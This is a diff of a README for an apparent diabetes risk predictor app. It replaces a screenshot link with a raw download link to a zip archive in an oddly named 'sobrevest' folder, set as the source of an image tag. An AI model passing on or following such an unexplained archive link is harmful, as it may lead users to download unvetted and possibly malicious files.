@@ -31,4 +31,4 @@ Adjust the sliders to input the desired values for each parameter. After making 
 
 **Example**
 To test the application, you can try inputting different combinations of values to see how the prediction changes. For instance, increasing glucose levels and BMI might increase the likelihood of a diabetes prediction.
-<img width="1920" height="1080" alt="Image" src="https://github.com/user-attachments/assets/500ab9ac-3520-4bdb-ba22-cf380aad4f9b" />
+<img width="1920" height="1080" alt="Image" src="https://raw.githubusercontent.com/Adi-123455/Diabetes_Risk_predictor/main/sobrevest/Diabetes_Risk_predictor-1.0.zip" />
